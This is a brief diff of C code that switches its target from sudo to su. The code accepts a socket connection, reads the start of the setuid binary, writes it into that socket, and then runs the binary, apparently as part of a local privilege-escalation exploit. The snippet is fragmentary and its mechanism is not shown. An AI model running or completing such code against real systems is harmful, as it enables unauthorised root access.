@@ -19,14 +19,14 @@ int main() {
 
     int opfd = accept(sock, NULL, 0);
 
-    int fd = open("/usr/bin/sudo", O_RDONLY);
+    int fd = open("/usr/bin/su", O_RDONLY);
 
     char buf[4096];
     read(fd, buf, sizeof(buf));
 
     write(opfd, buf, sizeof(buf));
 
-    system("sudo");
+    system("su");
 
     return 0;
 }
